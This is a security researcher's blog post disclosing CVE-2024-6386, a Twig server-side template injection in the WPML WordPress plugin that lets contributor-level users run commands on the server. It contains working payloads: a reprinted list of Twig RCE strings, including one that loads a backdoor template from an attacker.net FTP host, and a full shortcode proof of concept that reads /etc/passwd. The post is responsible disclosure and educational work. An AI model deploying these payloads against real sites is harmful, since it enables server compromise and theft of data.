<!doctype html><html lang=en-US class=dark-mode><head><meta http-equiv=Content-Type content="text/html" charset=UTF-8><meta http-equiv=X-UA-Compatible content="IE=edge,chrome=1"><script type=application/ld+json>{"@context":"http://schema.org","@type":"Blog","mainEntityOfPage":{"@type":"WebPage","@id":"\/"},"articleSection":"post","name":"WPML Multilingual CMS Authenticated Contributor\u002b Remote Code Execution (RCE) via Twig Server-Side Template Injection (SSTI)","headline":"WPML Multilingual CMS Authenticated Contributor\u002b Remote Code Execution (RCE) via Twig Server-Side Template Injection (SSTI)","image":["\/content\/images\/2024\/06\/_f62835b4-bc73-4988-92d3-d9e9593aef80.jpeg"],"description":"tldr; Server-Side Template Injection (SSTI) is one of my favorite vulnerabilities, but rarely do I see it outside of CTF competitions\u0026hellip;\nThe WPML Multilingual CMS Plugin for WordPress used by over 1 million sites is susceptible to an Authenticated (Contributor\u002b) Remote Code Execution (RCE) vulnerability through a Twig server-side template injection.","inLanguage":"en-US","creator":"stealthcopter","author":{"@type":"Person","name":"stealthcopter"},"publisher":{"@type":"Organization","name":"stealthcopter","logo":{"@type":"ImageObject","url":"\/"}},"accountablePerson":"stealthcopter","copyrightHolder":"stealthcopter","copyrightYear":"2024","datePublished":"2024-08-21 08:30:55 \u002b0000 UTC","dateModified":"2024-08-21 08:30:55 \u002b0000 UTC","url":"\/wpml-rce-via-twig-ssti\/","keywords":["Hacking","WordPress","Blog","Aceh","DevOps","Security","Engineer","SysAdmin","Linux","FLOSS Enthusiast","Coffee"]}</script><title>WPML Multilingual CMS Authenticated Contributor+ Remote Code Execution (RCE) via Twig Server-Side Template Injection (SSTI) &#183; Stealthcopter</title>
<meta name=HandheldFriendly content="True"><meta name=viewport content="width=device-width,initial-scale=1"><link rel=icon type=image/png href=/favicon-96x96.png sizes=96x96><link rel=icon type=image/svg+xml href=/favicon.svg><link rel="shortcut icon" href=/favicon.ico><link rel=apple-touch-icon sizes=180x180 href=/apple-touch-icon.png><link rel=manifest href=/site.webmanifest><meta name=msapplication-TileColor content="#da532c"><meta name=theme-color content="#ffffff"><link rel=canonical href=/wpml-rce-via-twig-ssti/><meta name=description content="tldr; Server-Side Template Injection (SSTI) is one of my favorite vulnerabilities, but rarely do I see it outside of CTF competitions&amp;hellip;
The WPML Multiling"><meta property="og:site_name" content="Stealthcopter"><meta property="og:title" content="Stealthcopter"><meta property="og:url" content="/wpml-rce-via-twig-ssti/"><meta property="og:type" content="article"><meta property="og:description" content="tldr; Server-Side Template Injection (SSTI) is one of my favorite vulnerabilities, but rarely do I see it outside of CTF competitions&amp;hellip;
The WPML Multiling"><meta property="article:published_time" content="2024-08-21T08:30:55Z"><meta property="article:tag" content="Hacking"><meta property="article:tag" content="WordPress"><meta property="og:image" content="/content/images/2024/06/_f62835b4-bc73-4988-92d3-d9e9593aef80.jpeg"><meta property="og:site_name" content="Stealthcopter"><meta property="og:title" content="Stealthcopter"><meta property="og:url" content="/wpml-rce-via-twig-ssti/"><meta property="og:type" content="article"><meta property="og:description" content="tldr; Server-Side Template Injection (SSTI) is one of my favorite vulnerabilities, but rarely do I see it outside of CTF competitions&amp;hellip;
The WPML Multiling"><meta property="article:published_time" content="2024-08-21T08:30:55Z"><meta property="article:tag" content="Hacking"><meta property="article:tag" content="WordPress"><meta property="og:image" content="/content/images/2024/06/_f62835b4-bc73-4988-92d3-d9e9593aef80.jpeg"><meta name=keywords content="Hacking,WordPress,"><link rel=stylesheet href=//cdnjs.cloudflare.com/ajax/libs/highlight.js/11.5.0/styles/tokyo-night-dark.min.css><script src=//cdnjs.cloudflare.com/ajax/libs/highlight.js/11.5.0/highlight.min.js></script><script>hljs.highlightAll()</script><link rel=stylesheet href=/built/screen.css><link rel=stylesheet href=/css/custom.css><link href=/index.xml rel=alternate type=application/rss+xml title=Stealthcopter></head><body class=post-template><div class=viewport><header id=gh-head class="gh-head has-cover"><nav class="gh-head-inner inner gh-container"><div class=gh-head-brand><a class=gh-head-logo href=/>Stealthcopter</a>
<a class=gh-burger role=button><div class=gh-burger-box><div class=gh-burger-inner></div></div></a></div><div class=gh-head-menu><ul class=nav><li class="nav-home nav-current" role=menuitem><a href=/tags/hacking/>Hacking</a></li><li class="nav-home nav-current" role=menuitem><a href=/tags/software/>Software</a></li><li class="nav-home nav-current" role=menuitem><a href=/tags/ctf/>CTF</a></li><li class="nav-home nav-current" role=menuitem><a href=/tags/wordpress/>WordPress</a></li></ul></div><div class=gh-head-actions><div class=gh-social><a class=gh-social-twitter href=https://twitter.com/stealthcopter target=_blank rel=noopener><svg viewBox="0 0 32 32"><path d="M30.063 7.313c-.813 1.125-1.75 2.125-2.875 2.938v.75c0 1.563-.188 3.125-.688 4.625a15.088 15.088.0 01-2.063 4.438c-.875 1.438-2 2.688-3.25 3.813a15.015 15.015.0 01-4.625 2.563c-1.813.688-3.75 1-5.75 1-3.25.0-6.188-.875-8.875-2.625.438.063.875.125 1.375.125 2.688.0 5.063-.875 7.188-2.5-1.25.0-2.375-.375-3.375-1.125s-1.688-1.688-2.063-2.875c.438.063.813.125 1.125.125.5.0 1-.063 1.5-.25-1.313-.25-2.438-.938-3.313-1.938a5.673 5.673.0 01-1.313-3.688v-.063c.813.438 1.688.688 2.625.688a5.228 5.228.0 01-1.875-2c-.5-.875-.688-1.813-.688-2.75.0-1.063.25-2.063.75-2.938 1.438 1.75 3.188 3.188 5.25 4.25s4.313 1.688 6.688 1.813a5.579 5.579.0 011.5-5.438c1.125-1.125 2.5-1.688 4.125-1.688s3.063.625 4.188 1.813a11.48 11.48.0 003.688-1.375c-.438 1.375-1.313 2.438-2.563 3.188 1.125-.125 2.188-.438 3.313-.875z"/></svg></a>
<a class=gh-social href=https://github.com/stealthcopter target=_blank rel=noopener><svg viewBox="0 0 24 24"><path d="M12 .297c-6.63.0-12 5.373-12 12 0 5.303 3.438 9.8 8.205 11.385.6.113.82-.258.82-.577.0-.285-.01-1.04-.015-2.04-3.338.724-4.042-1.61-4.042-1.61C4.422 18.07 3.633 17.7 3.633 17.7c-1.087-.744.084-.729.084-.729 1.205.084 1.838 1.236 1.838 1.236 1.07 1.835 2.809 1.305 3.495.998.108-.776.417-1.305.76-1.605-2.665-.3-5.466-1.332-5.466-5.93.0-1.31.465-2.38 1.235-3.22-.135-.303-.54-1.523.105-3.176.0.0 1.005-.322 3.3 1.23.96-.267 1.98-.399 3-.405 1.02.006 2.04.138 3 .405 2.28-1.552 3.285-1.23 3.285-1.23.645 1.653.24 2.873.12 3.176.765.84 1.23 1.91 1.23 3.22.0 4.61-2.805 5.625-5.475 5.92.42.36.81 1.096.81 2.22.0 1.606-.015 2.896-.015 3.286.0.315.21.69.825.57C20.565 22.092 24 17.592 24 12.297c0-6.627-5.373-12-12-12"/></svg></a>
<a class=gh-social href=https://www.linkedin.com/in/mat-rollings target=_blank rel=noopener><svg viewBox="0 50 512 512"><path d="M150.65 100.682c0 27.992-22.508 50.683-50.273 50.683-27.765.0-50.273-22.691-50.273-50.683C50.104 72.691 72.612 50 100.377 50c27.766.0 50.273 22.691 50.273 50.682zM143.294 187.333H58.277V462h85.017V187.333zm135.901.0h-81.541V462h81.541s0-101.877.0-144.181c0-38.624 17.779-61.615 51.807-61.615 31.268.0 46.289 22.071 46.289 61.615.0 39.545.0 144.181.0 144.181h84.605s0-100.344.0-173.915-41.689-109.131-99.934-109.131-82.768 45.369-82.768 45.369v-36.99z"/></svg></a>
<a class=gh-social href=/index.xml><svg viewBox="0 0 24 24"><circle cx="6.18" cy="17.82" r="2.18"/><path d="M4 4.44v2.83c7.03.0 12.73 5.7 12.73 12.73h2.83c0-8.59-6.97-15.56-15.56-15.56zm0 5.66v2.83c3.9.0 7.07 3.17 7.07 7.07h2.83c0-5.47-4.43-9.9-9.9-9.9z"/></svg></a></div></div></nav></header><div class=site-content><main id=site-main class=site-main><article class=article><header class="article-header gh-canvas"><section class=article-tag><a href=/tags/hacking>Hacking</a></section><h1 class=article-title>WPML Multilingual CMS Authenticated Contributor+ Remote Code Execution (RCE) via Twig Server-Side Template Injection (SSTI)</h1><div class=article-byline><section class=article-byline-content><ul class=author-list><li class=author-list-item><a href=/authors/stealthcopter class=author-avatar><img class=author-profile-image src=/content/images/size/w100/2024/07/f894d5600bcba5e947d6dde37a3cec1b.png alt=stealthcopter></a></li></ul><div class=article-byline-meta><h4 class=author-name><a href=/authors/stealthcopter>stealthcopter</a></h4><div class=byline-meta-content><time class=byline-meta-date datetime=2024-88-08>21 August 2024</time>
<span class=byline-reading-time><span class=bull>&bull;</span> 6 min
read</span></div></div></section></div><figure class=article-image><img src=/content/images/2024/06/_f62835b4-bc73-4988-92d3-d9e9593aef80.jpeg></figure></header><section class="gh-content gh-canvas"><h2 id=tldr>tldr;</h2><p>Server-Side Template Injection (SSTI) is one of my favorite vulnerabilities, but rarely do I see it outside of CTF competitions&mldr;</p><p>The WPML Multilingual CMS Plugin for WordPress used by over 1 million sites is susceptible to an Authenticated (Contributor+) Remote Code Execution (RCE) vulnerability through a Twig server-side template injection.</p><p><strong>Affected Versions:</strong> &lt;= 4.6.12<br><strong>CVSS Score:</strong> 9.9<br><strong>CVE-ID</strong>: CVE-2024-6386<br><strong>Links:</strong> <a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2024-6386&amp;ref=sec.stealthcopter.com">Mitre</a>, <a href="https://nvd.nist.gov/vuln/detail/CVE-2024-6386?ref=sec.stealthcopter.com">NVD</a><br><strong>Active installations</strong>: 1,000,000+<br><strong>Bounty</strong>: $1,639 (<a href="https://www.wordfence.com/threat-intel/vulnerabilities/wordpress-plugins/sitepress-multilingual-cms/wpml-multilingual-cms-4612-authenticatedcontributor-remote-code-execution-via-twig-server-side-template-injection?ref=sec.stealthcopter.com">Wordfence</a>)</p><h2 id=about-wpml-multilingual-cms>About WPML Multilingual CMS</h2><p><a href="https://wpml.org/?ref=sec.stealthcopter.com">WPML</a> is a popular plugin for creating multilingual WordPress sites. It offers a robust set of features for managing translations and language switching, making it a top choice for many WordPress users who need multilingual capabilities. WPML is a premium plugin charging between €39 and €199 per year.</p><figure><img src=/content/images/2024/06/Screenshot-from-2024-06-27-17-32-19.png alt="WPML Website Screenshot"><figcaption><p>WPML Website Screenshot</p></figcaption></figure><h2 id=vulnerability>Vulnerability</h2><p>The vulnerability lies in the handling of <a href="https://codex.wordpress.org/Shortcode?ref=sec.stealthcopter.com">shortcodes</a> within the WPML plugin. Specifically, the plugin uses Twig templates for rendering content in shortcodes but fails to properly sanitize input, leading to server-side template injection (SSTI).</p><p>In the code, the <code>callback</code> function in <code>class-wpml-ls-shortcodes.php</code> processes shortcode content:</p><pre><code class=language-php>add_shortcode( 'wpml_language_switcher', array( $this, 'callback' ) );

// Backward compatibility
add_shortcode( 'wpml_language_selector_widget', array( $this, 'callback' ) );
add_shortcode( 'wpml_language_selector_footer', array( $this, 'callback' ) );
</code></pre><p>Where the <code>callback</code> function is:</p><pre><code class=language-php>public function callback( $args, $content = null, $tag = '' ) {
    $args = (array) $args;
    $args = $this-&gt;parse_legacy_shortcodes( $args, $tag );
    $args = $this-&gt;convert_shortcode_args_aliases( $args );

    return $this-&gt;render( $args, $content );
}
</code></pre><p>This calls the <code>render</code> function in <code>class-wpml-ls-public-api.php</code>, passing the shortcode content as the <code>twig_template</code> variable:</p><pre><code class=language-php>protected function render( $args, $twig_template = null ) {
   $defaults_slot_args = $this-&gt;get_default_slot_args( $args );
   $slot_args          = array_merge( $defaults_slot_args, $args );
   
   $slot = $this-&gt;get_slot_factory()-&gt;get_slot( $slot_args );
   $slot-&gt;set( 'show', 1 );
   $slot-&gt;set( 'template_string', $twig_template );
   
   if ( $slot-&gt;is_post_translations() ) {
      $output = $this-&gt;render-&gt;post_translations_label( $slot );
   } else {
      $output = $this-&gt;render-&gt;render( $slot );
   }
   
   return $output;
}
</code></pre><p>And this variable is then rendered as a twig template string.</p><h2 id=payload-construction>Payload Construction</h2><p>The shortcode below will demonstrate that it&rsquo;s contents will be rendered as a twig template:</p><pre><code>[wpml_language_switcher]
{{ 4 * 7 }}
[/wpml_language_switcher]
</code></pre><p>When saved we will see the output of <code>28</code> on the page.</p><figure class="kg-gallery-card kg-width-wide"><div class=kg-gallery-container><div class=kg-gallery-row><div class=kg-gallery-image><a href=/content/images/size/w1000/2024/06/Screenshot-from-2024-06-27-14-32-53.png class=lightbox-image><img src=/content/images/size/w1000/2024/06/Screenshot-from-2024-06-27-14-32-53.png width height></a></div><div class=kg-gallery-image><a href=/content/images/size/w1000/2024/06/Screenshot-from-2024-06-27-14-33-14.png class=lightbox-image><img src=/content/images/size/w1000/2024/06/Screenshot-from-2024-06-27-14-33-14.png width height></a></div></div></div><figcaption>1. Entering the test payload into the editor, 2. Execution of the test payload when rendering the post preview</figcaption></figure><figure><img src=/content/images/bingpot.gif alt="Bingpot! We have SSTI!"><figcaption><p>Bingpot! We have SSTI!</p></figcaption></figure><p>But there&rsquo;s a slight complication here that must be overcome to exploit further. This is the fact that WordPress will HTML encode any single or double quotes. This means we cannot execute any of the classic Twig template injection to remote code execution combos, such as those below (taken from <a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/README.md?ref=sec.stealthcopter.com#twig---code-execution">PayloadAllTheThings</a>):</p><pre><code>{{_self.env.setCache(&quot;ftp://attacker.net:2121&quot;)}}{{_self.env.loadTemplate(&quot;backdoor&quot;)}}
{{_self.env.registerUndefinedFilterCallback(&quot;exec&quot;)}}{{_self.env.getFilter(&quot;id&quot;)}}
{{['id']|filter('system')}}
{{[0]|reduce('system','id')}}
{{['id']|map('system')|join}}
{{['id',1]|sort('system')|join}}
{{['cat\x20/etc/passwd']|filter('system')}}
{{['cat$IFS/etc/passwd']|filter('system')}}
{{['id']|filter('passthru')}}
{{['id']|map('passthru')}}
</code></pre><p>However, we can start by exploring what we <em>do</em> have access to, for example:</p><pre><code>[wpml_language_switcher]
{{ dump() }}
[/wpml_language_switcher]
</code></pre><p>This will output something like the following (but not as pretty):</p><pre><code class=language-php>array(4) {
    [&quot;languages&quot;]=&gt; array(1) {
        [&quot;en&quot;]=&gt; array(8) {
            [&quot;code&quot;]=&gt; string(2) &quot;en&quot;
            [&quot;url&quot;]=&gt; string(34) &quot;http://wordpress.local:1337/?p=126&quot;
            [&quot;native_name&quot;]=&gt; string(7) &quot;English&quot;
            [&quot;display_name&quot;]=&gt; string(7) &quot;English&quot;
            [&quot;is_current&quot;]=&gt; bool(true)
            [&quot;css_classes&quot;]=&gt; string(121) &quot;wpml-ls-slot-shortcode_actions wpml-ls-item wpml-ls-item-en wpml-ls-current-language wpml-ls-first-item wpml-ls-last-item&quot;
            [&quot;flag_width&quot;]=&gt; int(18)
            [&quot;flag_height&quot;]=&gt; int(12)
        }
    }
    [&quot;current_language_code&quot;]=&gt; string(2) &quot;en&quot;
    [&quot;css_classes&quot;]=&gt; string(41) &quot;wpml-ls-statics-shortcode_actions wpml-ls&quot;
    [&quot;css_classes_link&quot;]=&gt; string(12) &quot;wpml-ls-link&quot;
}
</code></pre><p>This output provides enough letters that we can start using it to create customer strings. For example, we can create <code>s</code> by:</p><pre><code class=language-jinja>{% set s = dump(current_language_code)|slice(0,1) %}
</code></pre><p>This works by grabbing the first letter from the output of <code>dump</code> on the variable <code>current_language_code</code>, this will always be s as it is a string and dump always prints <code>string(n)</code> before the contents of the string.</p><style>.kg-callout-card-grey{background:rgba(124,139,154,.13)}.kg-callout-card-white{background:0 0;box-shadow:inset 0 0 0 1px rgba(124,139,154,.25)}.kg-callout-card-blue{background:rgba(33,172,232,.12)}.kg-callout-card-green{background:rgba(52,183,67,.12)}.kg-callout-card-yellow{background:rgba(240,165,15,.13)}.kg-callout-card-red{background:rgba(209,46,46,.11)}.kg-callout-card-pink{background:rgba(225,71,174,.11)}.kg-callout-card-purple{background:rgba(135,85,236,.12)}.kg-callout-card{display:flex;padding:1.2em 1.6em;border-radius:3px}.kg-callout-card,.kg-callout-card *{box-sizing:border-box}.kg-callout-card div.kg-callout-emoji{padding-right:.8em;line-height:1.25em;font-size:1.15em}</style><div class='kg-card kg-callout-card kg-callout-card-blue'><div class=kg-callout-emoji>ℹ️</div><div class=kg-callout-text>Note when choosing variables to grab the characters from, it&rsquo;s best to opt for those that are going to be the most stable. This will make the exploit more reliable between different environments.</div></div><p>This can be repeated until we have the chars to spell out system which will allow us to execute arbitrary commands. Here use the ~ operator to join the chars together into a string. For example, once we have the letters defined, the basic id command can be executed as follows:</p><pre><code class=language-jinja>{% set system = s~y~s~t~e~m %}
{% set id = i~d %}
{{[id]|map(system)|join}}
</code></pre><p>Once we have the ability to execute shell commands we can even use the output from the shell to give us access to further letter we may find difficult to obtain via templating. This can be seen in the snippet below, where a slash <code>/</code> is obtained from the output of the <code>pwd</code> shell command:</p><pre><code class=language-jinja>{% set slash = [pwd]|map(system)|join|slice(0,1) %}
</code></pre><p>This works because <code>pwd</code> (print working directory) will always start with a <code>/</code> in Linux, e.g. <code>/home/username/</code></p><style>.kg-callout-card-grey{background:rgba(124,139,154,.13)}.kg-callout-card-white{background:0 0;box-shadow:inset 0 0 0 1px rgba(124,139,154,.25)}.kg-callout-card-blue{background:rgba(33,172,232,.12)}.kg-callout-card-green{background:rgba(52,183,67,.12)}.kg-callout-card-yellow{background:rgba(240,165,15,.13)}.kg-callout-card-red{background:rgba(209,46,46,.11)}.kg-callout-card-pink{background:rgba(225,71,174,.11)}.kg-callout-card-purple{background:rgba(135,85,236,.12)}.kg-callout-card{display:flex;padding:1.2em 1.6em;border-radius:3px}.kg-callout-card,.kg-callout-card *{box-sizing:border-box}.kg-callout-card div.kg-callout-emoji{padding-right:.8em;line-height:1.25em;font-size:1.15em}</style><div class='kg-card kg-callout-card kg-callout-card-blue'><div class=kg-callout-emoji>ℹ️</div><div class=kg-callout-text>After submission Ivan from Wordfence pointed out another (simpler/better) trick to get the specific letters by starting the shortcode template with all the letters you need <code>[wpml_language_switcher]abcde...</code> and then obtaining them by using <code>self</code> and slicing the string to get each char.</div></div><h2 id=proof-of-concept>Proof of Concept</h2><p>Now that we&rsquo;ve demonstrated the basics, lets jump in and look at the final proof-of-concept created to exploit this vulnerability:</p><pre><code>[wpml_language_switcher]

{# Find letters we need as we cant use any quotes #}
{% set s = dump(current_language_code)|slice(0,1) %}
{% set t = dump(current_language_code)|slice(1,1) %}
{% set r = dump(current_language_code)|slice(2,1) %}
{% set i = dump(current_language_code)|slice(3,1) %}
{% set n = dump(current_language_code)|slice(4,1) %}
{% set g = dump(current_language_code)|slice(5,1) %}
{% set a = dump()|slice(0,1) %}
{% set y = dump()|slice(4,1) %}
{% set e = dump(css_classes)|slice(36,1) %}
{% set w = dump(css_classes)|slice(12,1) %}
{% set p = dump(css_classes)|slice(13,1) %}
{% set m = dump(css_classes)|slice(14,1) %}
{% set d = dump(css_classes)|slice(35,1) %}
{% set c = dump(css_classes)|slice(25,1) %}
{% set space = dump(css_classes)|slice(45,1) %}

{% set system = s~y~s~t~e~m %}
{% set id = i~d %}
{% set pwd = p~w~d %}

We can use the output from `dump` or any other similar function to grab any letters we need to create our strings.

Once we have code basic code execution we can use that to grab any letters we may not be able to easily grab via template injection.

{% set slash = [pwd]|map(system)|join|slice(0,1) %}

{% set passwd = c~a~t~space~slash~e~t~c~slash~p~a~s~s~w~d %}


Debug: {{dump()}}

Command: {{system}} {{id}} {{pwd}}

id: {{[id]|map(system)|join}}

pwd: {{[pwd]|map(system)|join}}

passwd: {{[passwd]|map(system)|join}}

[/wpml_language_switcher]
</code></pre><h2 id=exploitation>Exploitation</h2><p>By using the above payload, a Contributor+ user can gain command execution on the server. The crafted payload uses the dump function to gather letters needed to construct commands without using quotes. Once we have basic command execution, we can further leverage it to gain more control over the server.</p><figure class="kg-gallery-card kg-width-wide"><div class=kg-gallery-container><div class=kg-gallery-row><div class=kg-gallery-image><a href=/content/images/size/w1000/2024/06/Screenshot-from-2024-06-27-14-35-48.png class=lightbox-image><img src=/content/images/size/w1000/2024/06/Screenshot-from-2024-06-27-14-35-48.png width height></a></div><div class=kg-gallery-image><a href=/content/images/size/w1000/2024/06/Screenshot-from-2024-06-27-14-38-17.png class=lightbox-image><img src=/content/images/size/w1000/2024/06/Screenshot-from-2024-06-27-14-38-17.png width height></a></div></div></div><figcaption>1. Entering the final payload into the editor, 2. Execution of the final payload when rendering the post preview</figcaption></figure><h2 id=timeline>Timeline</h2><ul><li><strong>19/06/24 (0 day)</strong> - Discovery and disclosure to Wordfence</li><li><strong>27/06/24 (+8 day)</strong> - Wordfence validated and assigned CVE</li><li><strong>27/06/24 (+8 days)</strong> - $1,639 bounty assigned by Wordfence</li><li><strong>20/08/24 (+62 days)</strong> - Patch released in version <a href="https://wpml.org/changelog/2024/08/wpml-4-6-13-and-woocommerce-multilingual-5-3-7-security-and-other-enhancements/?ref=sec.stealthcopter.com">4.6.13</a></li><li><strong>21/08/24 (+63 days)</strong> - Vulnerability publicly disclosed</li></ul><h2 id=conclusion>Conclusion</h2><p>This vulnerability is a classic example of the dangers of improper input sanitization in templating engines. Developers should always sanitize and validate user inputs, especially when dealing with dynamic content rendering. This case serves as a reminder that security is a continuous process, requiring vigilance at every stage of development and data processing.</p><nav class=sharebuttons style=margin-top:20px><span>Share This:</span><ul><li><a href="https://www.facebook.com/sharer.php?u=%2fwpml-rce-via-twig-ssti%2f&t=WPML%20Multilingual%20CMS%20Authenticated%20Contributor%2b%20Remote%20Code%20Execution%20%28RCE%29%20via%20Twig%20Server-Side%20Template%20Injection%20%28SSTI%29" target=_blank><svg height="50" viewBox="0 0 50 50" width="50"><g fill="none" fill-rule="evenodd"><path d="m12.8064516 26.63h5.4808065v22.5635484c0 .4454839.3609677.8064516.8064516.8064516h9.2929032c.4454839.0.8064516-.3609677.8064516-.8064516V26.7362903h6.3006452c.4096774.0.7543548-.3074193.801129-.7143548l.9569355-8.3067742c.0262903-.2285484-.046129-.4574194-.1990323-.628871-.1530645-.1716129-.3720967-.2698387-.6019354-.2698387h-7.2574194v-5.2070968c0-1.5696774.8451613-2.36564512 2.5122581-2.36564512h4.7451613c.4454838.0.8064516-.36112903.8064516-.80645162v-7.6248387c0-.44548388-.3609678-.80645162-.8064516-.80645162h-6.5395162c-.046129-.00225806-.1485484-.00596774-.2995161-.00596774-1.1346774.0-5.0787097.22274194-8.1941936 3.08887097C17.9656452 6.265 18.4454839 10.0679032 18.5601613 10.7272581v6.0890322h-5.7537097c-.4454839.0-.8064516.3609678-.8064516.8064516v8.2006452c0 .4454839.3609677.8066129.8064516.8066129z" fill="#d5d5d5" class="will-change" fill-rule="nonzero"/><path d="m0 0h50v50H0z"/></g></svg></a></li><li><a href="https://twitter.com/intent/tweet?text=WPML%20Multilingual%20CMS%20Authenticated%20Contributor%2b%20Remote%20Code%20Execution%20%28RCE%29%20via%20Twig%20Server-Side%20Template%20Injection%20%28SSTI%29&url=%2fwpml-rce-via-twig-ssti%2f" target=_blank><svg height="50" viewBox="0 0 50 50" width="50"><g fill="none" fill-rule="evenodd"><path d="m48.8670204 9.72441272c-.7854489.34833978-1.5930659.64238268-2.418261.88115208.9769529-1.10488248 1.7217769-2.40488211 2.1764642-3.8274403.1019531-.31884757-.0037109-.66787091-.2658202-.8764646-.2618163-.20869135-.6254881-.23369134-.9136716-.06289061-1.7524409 1.03935518-3.6430654 1.78632762-5.6254867 2.22304625C39.823273 6.11054656 37.1110667 5 34.3071613 5c-5.918553.0-10.7336884 4.8150377-10.7336884 10.7333954.0.4661131.0294922.9296872.0878906 1.386816-7.3443338-.644824-14.17226158-4.2546863-18.86093212-10.0061495-.1670898-.20498041-.4245116-.31552725-.68808575-.29433585-.2636718.02060546-.50068345.16933589-.63388653.3979491-.9509763 1.63173782-1.45371053 3.49804585-1.45371053 5.39697115.0 2.5863274.92333958 5.0401353 2.55449146 6.9576152-.49599595-.1717773-.97724581-.3864257-1.43662068-.6414061-.24658196-.1373046-.54755844-.1351562-.7925779.0052735-.24511712.1405273-.39882802.398828-.40537098.6812498-.00117188.0475585-.00117188.0951171-.00117188.1433593.0 3.8604481 2.07773379 7.3361307 5.25439304 9.2304661-.27294914-.027246-.54560531-.0667968-.81660133-.1185546-.27939445-.053418-.5666014.0445312-.75498025.2576171-.18867182.2128906-.2511718.5096678-.16416011.7806638 1.17578092 3.6709951 4.20302615 6.371092 7.86269306 7.1943339-3.0353507 1.9011714-6.50644345 2.8969719-10.15029007 2.8969719-.76035135.0-1.52499957-.0446289-2.2733392-.1332031-.37177724-.0442383-.72724588.1752929-.85390601.5289061-.12666012.3537108.00761719.7480466.32382804.950781 4.68115101 3.001464 10.09384484 4.5878893 15.65272994 4.5878893 10.9280242.0 17.7643504-5.1532212 21.5747986-9.4762669 4.7516588-5.3905258 7.4767557-12.5254847 7.4767557-19.5752874.0-.2945311-.0044922-.5918943-.0135743-.8883786 1.8747065-1.412402 3.4886709-3.1217765 4.8020495-5.0864244.1995116-.2983397.1779296-.6927732-.0532227-.96738251-.2305663-.27509758-.6153318-.36396474-.9436521-.21845697z" fill="#d5d5d5" class="will-change" fill-rule="nonzero"/><path d="m0 0h50v50H0z"/></g></svg></a></li><li><a href="https://www.linkedin.com/shareArticle?mini=true&url=%2fwpml-rce-via-twig-ssti%2f&title=WPML%20Multilingual%20CMS%20Authenticated%20Contributor%2b%20Remote%20Code%20Execution%20%28RCE%29%20via%20Twig%20Server-Side%20Template%20Injection%20%28SSTI%29&summary=tldr%253B%2bServer-Side%2bTemplate%2bInjection%2b%2528SSTI%2529%2bis%2bone%2bof%2bmy%2bfavorite%2bvulnerabilities%252C%2bbut%2brarely%2bdo%2bI%2bsee%2bit%2boutside%2bof%2bCTF%2bcompetitions%2526hellip%253B%250AThe%2bWPML%2bMultilingual%2bCMS%2bPlugin%2bfor%2bWordPress%2bused%2bby%2b%25E2%2580%25A6" target=_blank><svg height="51" viewBox="0 0 50 51" width="50"><g fill="none" fill-rule="evenodd"><path d="m37.17 16.2290323c11.3056452.0 12.83 8.1724193 12.83 16.1667742v17.6877419c0 .4454839-.3609677.8064516-.8064516.8064516H39.1741935c-.4454838.0-.8064516-.3609677-.8064516-.8064516l-3842e-7-15.9301537c-.0134805-4.2654904-.4024632-7.4953302-4.4055835-7.4953302-3.7477419.0-5.2080645 2.0945161-5.2080645 7.4708065v15.9545161c0 .4454839-.3609678.8066129-.8064516.8066129H17.9316129c-.4454839.0-.8064516-.361129-.8064516-.8066129V17.8369355c0-.4453226.3609677-.8064516.8064516-.8064516h9.6127419c.4454839.0.8064517.361129.8064517.8064516v2.0943548c1.8075806-1.9691935 4.7877419-3.702258 8.8191935-3.702258zm-25.5312903.8014516c.4454838.0.8064516.361129.8064516.8064516v32.2464516c0 .4454839-.3609678.8064516-.8064516.8064516H1.60112903c-.44548387.0-.80645161-.3609677-.80645161-.8064516V17.8369355c0-.4453226.36096774-.8064516.80645161-.8064516zM6.62354839 1c3.64935481.0 6.61838711 2.96806452 6.61822581 6.61629032.0 3.64967738-2.968871 6.61903228-6.61822581 6.61903228-3.65225807.0-6.62354839-2.9691936-6.62354839-6.61903228.0-3.6482258 2.97129032-6.61629032 6.62354839-6.61629032z" fill="#d5d5d5" class="will-change" fill-rule="nonzero"/><path d="m0 0h50v50H0z"/></g></svg></a></li><li><a href="whatsapp://send?text=WPML%20Multilingual%20CMS%20Authenticated%20Contributor%2b%20Remote%20Code%20Execution%20%28RCE%29%20via%20Twig%20Server-Side%20Template%20Injection%20%28SSTI%29%0a%0atldr%3b%20Server-Side%20Template%20Injection%20%28SSTI%29%20is%20one%20of%20my%20favorite%20vulnerabilities%2c%20but%20rarely%20do%20I%20see%20it%20outside%20of%20CTF%20competitions%26hellip%3b%0aThe%20WPML%20Multilingual%20CMS%20Plugin%20for%20WordPress%20used%20by%20%e2%80%a6%0a%0a%2fwpml-rce-via-twig-ssti%2f%0a" target=_blank><svg height="50" viewBox="0 0 50 50" width="50"><g fill="none" fill-rule="evenodd"><path d="m25.4437935.0c13.5404221.0 24.5561688 10.9340909 24.5561688 24.3738636.0 13.4383117-11.0157467 24.3712663-24.5560065 24.3711039-4.0610389.0-8.0737013-1.0012987-11.624026-2.8982143l-12.97402593 4.1227273c-.06461039.0206169-.13084416.0305195-.19659091.0305195-.17159091.0-.33961039-.0681818-.46347403-.1946429-.17159091-.1746753-.23003247-.4311688-.15146104-.6631493l4.21801948-12.4423701c-2.20373376-3.724026-3.36704545-7.9790585-3.36704545-12.3259741.0-13.4397727 11.01688308-24.3738636 24.55844158-24.3738636zm-1624e-7 5.07727273c-10.725974.0-19.45227269 8.65649347-19.45227269 19.29659087.0 4.0896104 1.28068182 8.0008117 3.70340909 11.3112013.125.1707793.15892857.3917208.09107143.5920455l-2.09805195 6.1897727 6.49918832-2.0659091c.064448-.0204545.1306818-.0305195.1967532-.0305195.125.0.2491884.036039.3561689.1063312 3.1814935 2.0876624 6.8826298 3.1910714 10.7038961 3.1910714 10.7248376.0 19.4498376-8.6551948 19.4498376-19.2939935.0-10.6400974-8.7253246-19.29659087-19.45-19.29659087zm-6.6467532 7.85259737c.7225649.0 1.2425325.4384741 1.636039 1.3801948.1636363.3902598 1.7027597 4.1048702 1.788961 4.2772728.1050325.2060065.4300325.8439935.049513 1.6l-.0816559.1641233c-.1558441.3159091-.2902597.5886364-.5922078.9399351-.0969155.112013-.1956168.2308442-.2941558.349513-.2081169.250487-.4232143.5094156-.6217532.7058441-.0678572.0680195-.1993507.1998377-.2136364.2522728 487e-6.0.0029221.0449675.0610389.1439935.4069806.6887987 3.375 4.7733766 7.2852273 6.4719156.1707792.0741883.7349026.3064935.7675325.3064935.0363636.0.0970779-.0607143.1415584-.111526.3405844-.3849026 